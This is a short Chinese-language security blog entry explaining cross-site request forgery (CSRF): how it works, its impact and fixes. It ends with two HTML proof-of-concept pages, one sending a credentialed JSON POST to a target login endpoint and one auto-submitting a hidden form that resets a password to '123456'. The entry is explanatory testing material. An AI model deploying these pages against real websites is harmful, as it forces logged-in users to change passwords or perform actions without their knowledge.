---
author: YOUZAI
title: 跨站请求伪造
date: 2023/04/24
categories:
 - 常见漏洞
tags:
 - WEB安全
---

## 漏洞原理

跨站请求伪造，是一种挟制用户在当前已登录的 web 应用程序上执行非本意操作的攻击方法。黑客利用已经登陆的用户,诱使其访问或者登陆某个早已构造好的恶意连接或者页面，然后再用户毫不知情的情况下，以用户的名义完成了非用户本意的非法操作。与 XSS 攻击相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对客户网页浏览器的信任。

## 漏洞危害

* 修改用户的个人信息。
* 执行恶意操作。
* 使用户在不知情的情况下执行了某些非用户本意的操作。

## 修复建议

* 验证 HTTP **Referer** 字段。
* 在请求地址中添加 **token** 并验证。
* **HTTP** 头中自定义属性并验证。

## 测试方法

让目标网站访问搭建好的 *VPS* 网站，在 *VPS* 上创建一个 **hack.html** 文件。

POC：

* 对于`json`数据包

```html
<!DOCTYPE html>
<html>
<body>
<script>
window.onload=function() {
  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'http://target/login');
  xhr.withCredentials = true;
  xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
  xhr.send({"user":"Admin","email":"","password":"123456"});
}
</script>
</body>
</html>
```

* 对于普通数据包

```html
<!DOCTYPE html>
<html>
  <body>
    <form action="http://localhost:80/reset.php" method="post">
      <input type="hidden" name="newpassword" value="123456" />
      <input type="hidden" name="repeatpassword" value="123456" />
      <input type="hidden" name="Submit" value="Login" />
    </form>
    <script>
    document.forms[0].submit();
  </script>
  </body>
</html>
```